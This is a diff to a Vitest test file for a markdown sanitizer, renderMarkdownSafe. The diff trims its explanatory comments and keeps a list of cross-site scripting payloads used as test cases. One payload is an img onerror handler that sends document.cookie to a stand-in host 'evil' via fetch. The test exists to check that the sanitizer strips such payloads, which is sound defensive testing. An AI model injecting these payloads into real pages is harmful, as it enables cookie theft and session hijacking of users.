@@ -1,12 +1,8 @@
 import { describe, expect, it } from "vitest";
 import { renderMarkdownSafe } from "../markdown";
 
-// The payloads are the point: this helper exists because campaign artifacts quote LLM output,
-// which quotes dataset rows a tenant uploaded. Each case is a construct that reached the
-// operator's browser through `marked.parse` + dangerouslySetInnerHTML before the tokenizer
-// override. Assert on the ABSENCE of the executable part, never on exact entity spelling —
-// escaping is marked's to choose, and pinning its output would fail on an upgrade that is
-// still safe.
+// Assert the ABSENCE of the executable part, never exact entity spelling — escaping is
+// marked's to choose, and a safe upgrade may change it.
 const EXECUTABLE = [
   ["block img handler", `<img src=x onerror="fetch('https://evil/'+document.cookie)">`],
   ["inline img handler", `a row that says <img src=x onerror=alert(1)> mid-sentence`],
@@ -38,8 +34,6 @@ describe("renderMarkdownSafe", () => {
   });
 
   it("keeps code fences readable rather than entity-noisy", () => {
-    // The reason raw HTML is killed at the tokenizer instead of by pre-escaping the source:
-    // pre-escaping would surface `&amp;lt;` inside fences, where the content is already safe.
     const html = renderMarkdownSafe(["```", "<div>literal</div>", "```"].join("\n"));
     expect(html).toContain("&lt;div&gt;literal&lt;/div&gt;");
     expect(html).not.toContain("&amp;lt;");
